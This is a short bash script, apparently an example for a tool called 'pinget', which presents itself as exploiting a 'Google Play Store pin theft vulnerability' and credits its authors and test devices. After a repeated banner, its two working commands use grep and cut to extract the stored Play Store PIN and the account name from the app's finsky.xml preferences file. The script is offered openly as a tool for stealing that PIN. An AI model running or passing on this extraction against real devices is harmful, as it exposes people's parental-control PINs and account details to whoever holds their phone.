#!/bin/bash
#!/bin/bash
<<COMMENT1
            ###################################################
            EXAMPLE - USE pinget.sh
            EXAMPLE - USE pinget.sh
            EXAMPLE - USE pinget.sh
            EXAMPLE - USE pinget.sh
            EXAMPLE - USE pinget.sh
            EXAMPLE - USE pinget.sh
            ###################################################
            
            ---------------------------------------------------
            pinget - Google Play Store pin theft vulnerability
            ---------------------------------------------------
            Made by cyr0s/compl3x (@Complex360)
            Thanks to zanderman112 && trter10
            ---------------------------------------------------"
            
            TESTED WITH NEXUS7 AND HTC ONE X USING CWM - TWRP? IDK
COMMENT1
echo "
            ###################################################
            EXAMPLE - USE pinget.sh
            EXAMPLE - USE pinget.sh
            EXAMPLE - USE pinget.sh
            EXAMPLE - USE pinget.sh
            EXAMPLE - USE pinget.sh
            EXAMPLE - USE pinget.sh
            ###################################################
            ---------------------------------------------------
            pinget - Google Play Store pin theft vulnerability
            ---------------------------------------------------
            Made by cyr0s/compl3x (@Complex360)
            Thanks to zanderman112 && trter10
            ---------------------------------------------------"

grep '<string name="pin_code"' finsky.xml | cut -f2 -d">"|cut -f1 -d"<"
grep '<string name="account"' finsky.xml | cut -f2 -d">"|cut -f1 -d"<"

